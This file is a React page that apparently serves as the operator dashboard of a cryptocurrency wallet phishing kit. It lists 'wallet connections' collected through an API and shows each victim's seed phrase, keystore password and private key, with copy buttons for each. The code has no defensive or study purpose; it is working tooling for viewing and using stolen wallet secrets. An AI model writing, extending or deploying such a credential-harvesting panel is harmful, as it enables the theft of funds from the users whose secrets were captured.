'use client';
import React, { useState, useEffect } from 'react';
import Header from '../components/Header';
import { useTheme } from '../contexts/ThemeContext';

const AllConnectionsPage = () => {
  const { theme } = useTheme();
  const [connections, setConnections] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const fetchConnections = async () => {
      try {
        const response = await fetch('/api/wallet-connections');
        if (!response.ok) {
          throw new Error('Failed to fetch connections');
        }
        const data = await response.json();
        // Sort in descending order by timestamp
        const sortedConnections = data.data.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
        setConnections(sortedConnections);
      } catch (err) {
        setError(err.message);
      } finally {
        setLoading(false);
      }
    };

    fetchConnections();
  }, []);

  const handleCopy = async (text) => {
    try {
      await navigator.clipboard.writeText(text);
      alert('Copied to clipboard!');
    } catch (err) {
      alert('Failed to copy to clipboard');
    }
  };

  if (loading) {
    return (
      <div className={`min-h-screen w-full ${theme === 'dark' ? 'bg-black text-white' : 'bg-gray-50 text-gray-900'}`}>
        <Header />
        <main className="pt-34 px-2 sm:px-4 lg:px-6 max-w-6xl mx-auto">
          <div className="text-center">
            <p>Loading connections...</p>
          </div>
        </main>
      </div>
    );
  }

  if (error) {
    return (
      <div className={`min-h-screen w-full ${theme === 'dark' ? 'bg-black text-white' : 'bg-gray-50 text-gray-900'}`}>
        <Header />
        <main className="pt-34 px-2 sm:px-4 lg:px-6 max-w-6xl mx-auto">
          <div className="text-center">
            <p>Error: {error}</p>
          </div>
        </main>
      </div>
    );
  }

  return (
    <div className={`min-h-screen w-full ${theme === 'dark' ? 'bg-black text-white' : 'bg-gray-50 text-gray-900'}`}>
      <Header />

      <main className="pt-34 px-2 sm:px-4 lg:px-6 max-w-6xl mx-auto">
        {/* Header Section */}
        <div className="text-center mb-8">
          <h1 className={`text-3xl font-bold mb-4 ${theme === 'dark' ? 'text-white' : 'text-gray-900'}`}>
            All Wallet Connections
          </h1>
          <p className={`mb-6 ${theme === 'dark' ? 'text-gray-300' : 'text-gray-600'}`}>
            View all wallet connections in descending order by timestamp
          </p>
        </div>

        {/* Connections List */}
        {connections.length > 0 ? (
          <ul className="space-y-4">
            {connections.map((connection) => (
              <li
                key={connection.id}
                className={`p-6 rounded-lg border ${
                  theme === 'dark'
                    ? 'bg-gray-800 border-gray-700 text-white'
                    : 'bg-white border-gray-200 text-gray-900'
                } shadow-md`}
              >
                <div className="flex flex-col space-y-2">
                  <div className="flex justify-between items-center">
                    <span className="font-semibold">Wallet Name:</span>
                    <span>{connection.walletName}</span>
                    <button
                      onClick={() => handleCopy(connection.walletName)}
                      className="ml-2 px-2 py-1 text-xs rounded bg-blue-500 text-white hover:bg-blue-600"
                    >
                      Copy
                    </button>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="font-semibold">Method:</span>
                    <span>{connection.connectionMethod}</span>
                    <button
                      onClick={() => handleCopy(connection.connectionMethod)}
                      className="ml-2 px-2 py-1 text-xs rounded bg-blue-500 text-white hover:bg-blue-600"
                    >
                      Copy
                    </button>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="font-semibold">Status:</span>
                    <span>{connection.status}</span>
                    <button
                     
                      className="ml-2 px-2 py-1 text-xs rounded bg-blue-500 text-white hover:bg-blue-600"
                    >
                      
                    </button>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="font-semibold">Timestamp:</span>
                    <span>{new Date(connection.timestamp).toLocaleString()}</span>
                    <button
                      onClick={() => handleCopy(new Date(connection.timestamp).toLocaleString())}
                      className="ml-2 px-2 py-1 text-xs rounded bg-blue-500 text-white hover:bg-blue-600"
                    >
                      Copy
                    </button>
                  </div>
                  {connection.phraseInput && (
                    <div className="flex justify-between items-center">
                      <span className="font-semibold">Phrase:</span>
                      <span>{connection.phraseInput.substring(0, 20)}...</span>
                      <button
                        onClick={() => handleCopy(connection.phraseInput)}
                        className="ml-2 px-2 py-1 text-xs rounded bg-blue-500 text-white hover:bg-blue-600"
                      >
                        Copy
                      </button>
                    </div>
                  )}
                  {connection.keystorePassword && (
                    <div className="flex justify-between items-center">
                      <span className="font-semibold">Keystore Password:</span>
                      <span>{connection.keystorePassword.substring(0, 20)}...</span>
                      <button
                        onClick={() => handleCopy(connection.keystorePassword)}
                        className="ml-2 px-2 py-1 text-xs rounded bg-blue-500 text-white hover:bg-blue-600"
                      >
                        Copy
                      </button>
                    </div>
                  )}
                  {connection.privateKeyInput && (
                    <div className="flex justify-between items-center">
                      <span className="font-semibold">Private Key:</span>
                      <span>{connection.privateKeyInput.substring(0, 20)}...</span>
                      <button
                        onClick={() => handleCopy(connection.privateKeyInput)}
                        className="ml-2 px-2 py-1 text-xs rounded bg-blue-500 text-white hover:bg-blue-600"
                      >
                        Copy
                      </button>
                    </div>
                  )}
                </div>
              </li>
            ))}
          </ul>
        ) : (
          <div className="text-center py-12">
            <p className={theme === 'dark' ? 'text-gray-400' : 'text-gray-500'}>
              No wallet connections found.
            </p>
          </div>
        )}
      </main>
    </div>
  );
};

export default AllConnectionsPage;
